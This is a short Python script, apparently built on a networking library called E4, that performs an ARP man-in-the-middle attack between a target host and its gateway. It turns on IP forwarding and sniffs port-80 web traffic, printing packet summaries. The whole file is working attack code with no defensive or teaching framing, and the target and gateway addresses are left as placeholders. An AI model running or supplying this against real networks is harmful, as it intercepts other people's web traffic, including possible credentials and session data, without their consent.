#!/usr/bin/python

import E4, E4Web, E4Arp, sys

# ARP MITM attack and sniff Web traffic.

e4Arp = E4Arp.Arp()
e4Sniffer = E4.AsyncSniffer()
e4PacketLog = E4.PacketLog()
e4Web = E4Web.Web()

e4Sniffer.sniff(packetLog=e4PacketLog, filter='port 80')

target = E4.NetworkObject()
target.setIP('<address>')

gateway = E4.NetworkObject()
gateway.setIP('<address>')

e4Arp.forward(True)
e4Arp.MITM(target, gateway)

try:
    while True:
        e4PacketLog.waitForPackets()

        for packet in e4PacketLog.takeAll():
            print packet.summary()

except KeyboardInterrupt:
    e4Arp.forward(False)
    sys.exit()

except:
    e4Arp.forward(False)
    sys.exit()